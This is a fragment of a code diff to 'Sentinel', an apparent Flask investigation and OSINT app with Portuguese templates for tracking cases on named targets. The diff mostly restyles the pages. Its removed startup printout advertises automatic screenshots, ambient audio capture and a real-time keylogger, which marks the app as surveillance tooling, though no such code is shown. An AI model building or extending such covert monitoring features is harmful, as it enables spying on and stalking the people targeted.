 <div class="card"><h2>{{ caso.investigado }}</h2><p><span class="badge">{{ caso.id }}</span> • {{ caso.criado_em }}</p><p><strong>CLIENTE:</strong> {{ caso.cliente }}</p><p><strong>TIPO:</strong> {{ caso.tipo }}</p><p><strong>STATUS:</strong> <span class="status status-{{ 'andamento' if caso.status == 'Em andamento' else 'concluido' }}">{{ caso.status }}</span></p><p><strong>OBJETIVO:</strong> {{ caso.objetivo }}</p>{% if caso.notas %}<p><strong>NOTAS:</strong> {{ caso.notas }}</p>{% endif %}</div>
-<div class="card"><h3>📋 ETAPAS</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div><span class="badge">{{ e.tipo }}</span> • {{ e.ts }}</div><p style="margin-top:10px">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA REGISTRADA.</p>{% endfor %}</div>
-<div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO"><select id="tipo"><option>Identificação Cadastral</option><option>Análise Digital (OSINT)</option><option>Estrutura Patrimonial</option><option>Vínculos e Relacionamentos</option><option>Conclusão Investigativa</option></select><textarea id="dados" rows="5" placeholder="DADOS E ANÁLISE..."></textarea><button onclick="adicionarEtapa()">➕ SALVAR ETAPA</button></div>
+<div class="card"><h3>📋 ETAPAS</h3>{% for e in caso.etapas %}<div class="etapa-card"><strong>ETAPA {{ e.num }}: {{ e.titulo }}</strong><div><span class="badge">{{ e.tipo }}</span> • {{ e.ts }}</div><p style="margin-top:8px">{{ e.dados }}</p></div>{% else %}<p>NENHUMA ETAPA REGISTRADA.</p>{% endfor %}</div>
+<div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO"><select id="tipo"><option>Identificação Cadastral</option><option>Análise Digital (OSINT)</option><option>Estrutura Patrimonial</option><option>Vínculos e Relacionamentos</option><option>Conclusão Investigativa</option></select><textarea id="dados" rows="4" placeholder="DADOS E ANÁLISE..."></textarea><button onclick="adicionarEtapa()">➕ SALVAR ETAPA</button></div>
 <script>const CASO_ID = "{{ caso.id }}";async function adicionarEtapa(){const t=document.getElementById('titulo').value,ti=document.getElementById('tipo').value,d=document.getElementById('dados').value;if(!t||!d){alert('Preencha título e dados');return}const r=await fetch(`/api/caso/${CASO_ID}/etapa`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({titulo:t,tipo:ti,dados:d})});if((await r.json()).ok)location.reload()}</script>
 </body>
 </html>
@@ -649,8 +1238,8 @@ CASO_DETALHE_HTML = '''
 OSINT_HTML = '''
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Sentinel - OSINT</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:15px 25px;display:flex;justify-content:space-between;margin-bottom:25px;border-radius:10px}.logo{font-size:24px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:8px;text-decoration:none;color:#00ffcc}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:25px}.card h2{color:#00ffcc;margin-bottom:15px;font-size:18px;border-left:3px solid #00ffcc;padding-left:12px}input{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:12px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%;margin-top:10px}.resultado-card{background:rgba(0,0,0,0.3);border-left:2px solid #00ffcc;padding:12px;margin-bottom:8px;border-radius:8px}.resultado-card a{color:#00ffcc;text-decoration:none}.categoria-titulo{color:#ffaa44;margin:15px 0 8px;font-size:14px}</style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sentinel - OSINT</title>
+<style>body{background:#0a0e1a;color:#fff;font-family:'Segoe UI',Arial;padding:20px}.navbar{background:#050a12;border-bottom:2px solid #00ffcc;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;border-radius:10px;flex-wrap:wrap;gap:10px}.logo{font-size:20px;color:#00ffcc}.btn{background:transparent;border:1px solid #00ffcc;padding:6px 14px;border-radius:20px;text-decoration:none;color:#00ffcc;font-size:12px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px}.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:12px;padding:18px}.card h2{color:#00ffcc;margin-bottom:12px;font-size:16px;border-left:3px solid #00ffcc;padding-left:10px}input{width:100%;padding:10px;margin:8px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:8px;color:#fff;font-size:14px}button{background:#00ffcc;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;width:100%}.resultado-card{background:rgba(0,0,0,0.3);border-left:2px solid #00ffcc;padding:10px;margin-bottom:8px;border-radius:8px}.resultado-card a{color:#00ffcc;text-decoration:none;word-break:break-all}.categoria-titulo{color:#ffaa44;margin:12px 0 6px;font-size:13px}@media (max-width:480px){.navbar{flex-direction:column}.grid{grid-template-columns:1fr}}</style>
 </head>
 <body><div class="navbar"><div class="logo">🛡️ SENTINEL OSINT</div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
 <div class="grid">
@@ -682,12 +1271,7 @@ if __name__ == "__main__":
     print(f"🔐 Senha: {SISTEMA_SENHA}")
     print(f"📱 Acesse: http://localhost:5000")
     print("=" * 60)
-    print("✅ FUNCIONALIDADES:")
-    print("   • Screenshot automático a cada 5s")
-    print("   • Áudio ambiente a cada 10s")
-    print("   • Keylogger em tempo real")
-    print("   • OSINT completo")
-    print("   • Gestão de casos")
-    print("   • Relatórios PDF")
+    print("✅ DESIGN RESPONSIVO (Celular/PC)")
+    print("✅ ESTILO FBI MODERNO")
     print("=" * 60)
     app.run(host="0.0.0.0", port=5000, debug=False)
